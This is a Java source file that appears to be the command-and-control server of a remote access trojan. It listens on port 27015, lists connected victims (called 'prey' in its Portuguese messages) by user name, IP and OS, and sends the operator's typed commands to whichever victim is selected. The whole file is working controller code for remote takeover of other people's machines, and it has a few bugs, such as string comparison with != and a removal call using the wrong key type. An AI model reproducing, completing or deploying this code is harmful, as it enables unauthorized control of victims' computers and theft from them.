package app;

import network.ClientConnection;
import network.Connection;
import network.Message;
import utils.ConsoleColors;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import static utils.ServerUtils.printCommandList;
import static utils.ServerUtils.startOnNewThread;

public class Server {

    private static ServerSocket serverSocket;
    private final static Map<Integer, ClientConnection> targets = new HashMap<>();
    private final static Map<ClientConnection, String> systemNames = new HashMap<>();
    private final static Map<ClientConnection, String> userOS = new HashMap<>();
    private static int id = 0;
    private static ClientConnection actualTarget;
    private static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) throws IOException {
        serverSocket = new ServerSocket(27015);
        System.out.println("Podipa vamo esperar o gatao entrar");

        clientConnection();
    }

    public static void clientConnection() {
        // resetta scanner
        sc = new Scanner(System.in);

        Socket clientSocket = null;
        try {
            clientSocket = serverSocket.accept();
        } catch(IOException e) {
            System.out.println("Deu pau no accept fi");
            e.printStackTrace();
        }
        System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());
        Connection targetConnection = new Connection(clientSocket);

        runHandlerThread(targetConnection);

        String command;
        do {
            System.out.println(ConsoleColors.BLUE + userString(actualTarget) + ConsoleColors.RESET + "\n");
            command = sc.nextLine();
            if(!isNullOrEmpty(command)) {
                switch(command) {
                    case "quit":
                        break;
                    case "help":
                        printCommandList();
                        break;
                    case "targets":
                        printTargets();
                        break;
                    case "target":
                        System.out.println("Qual ID, chefe?");
                        int targetIndex = sc.nextInt();
                        actualTarget = targets.get(targetIndex);
                        if(actualTarget != null) {
                            System.out.println("Ta mirado no " + formatIPandPORT(actualTarget));
                        } else {
                            System.out.println("Esse numero ta zuado chefe");
                        }
                        break;
                    default:
                        if(targets.isEmpty()) {
                            System.out.println("Chefe, a lista ta vazia");
                        } else if(command.isEmpty()) {
                            System.out.println("Mestre, comando ta vazio");
                        } else {
                            actualTarget.getConnection().sendMessage(new Message(command));
                        }
                }
            }
        } while(command != "quit");
    }

    public static void removeFromTargets(ClientConnection c) {
        System.out.println("Opa vai kickar o " + formatIPandPORT(c));
        targets.remove(c);

        // might or not be null
        actualTarget = targets.get(0);
    }

    public static void addUserOS(ClientConnection c, String os) {
        userOS.put(c, os);
    }

    public static void addUserSystemName(ClientConnection c, String user) {
        systemNames.put(c, user);
    }

    private static void printTargets() {
        for(int i = 1; i <= targets.size(); i++) {
            ClientConnection target = targets.get(i);
            System.out.println("(" + i + ") - " + userString(target));
        }

        System.out.println(ConsoleColors.GREEN + "-------------------------------------------------" + ConsoleColors.RESET);
    }

    private static void runHandlerThread(Connection targetConnection) {
        ClientConnection connection = new ClientConnection(targetConnection);
        targets.put(++id, connection);
        if(actualTarget == null) {
            actualTarget = connection;
        }
        startOnNewThread(connection);
    }

    private static boolean isNullOrEmpty(String command) {
        return command == null || command.isEmpty();
    }

    private static String formatIPandPORT(ClientConnection client) {
        return client.getConnection().getSocket().getInetAddress() + ":" + client.getConnection().getSocket().getPort();
    }

    private static String userString(ClientConnection c) {
        String userOS = Server.userOS.get(c);
        String userName = Server.systemNames.get(c);
        String userIP = formatIPandPORT(c);

        return userName + "@" + userIP + " [" + userOS + "]";
    }
}
